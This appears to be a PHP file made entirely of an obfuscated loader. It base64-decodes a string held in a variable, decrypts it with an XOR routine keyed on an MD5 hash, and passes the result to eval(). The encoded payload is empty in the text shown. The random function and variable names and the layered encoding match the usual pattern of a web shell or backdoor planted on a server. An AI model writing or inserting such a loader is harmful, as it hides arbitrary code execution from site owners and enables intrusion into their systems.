<?php
$vzyun="";
function rcmvkbis($vzyun, $cmvkbis){
    $ferbqg = md5($cmvkbis);
    $lrnetsq = '';
    $ewlscj = strlen($vzyun);
    for($i=0, $j=0; $i<$ewlscj; $i++, $j++){
        $j = $j == 32 ? 0 : $j;
        $lrnetsq .= $vzyun[$i] ^ $ferbqg[$j];
    }
    return $lrnetsq;
}
function dzimj($vzyun){
    $vzyun = rcmvkbis(base64_decode($vzyun),'KF57'.'8@Er');
    $ewlscj = strlen($vzyun);
    $lrnetsq = '';
    for($i=0; $i<$ewlscj; $i++){
        $lrnetsq .= $vzyun[$i] ^ $vzyun[++$i];
    }
    return $lrnetsq;
}
eval(dzimj($vzyun));
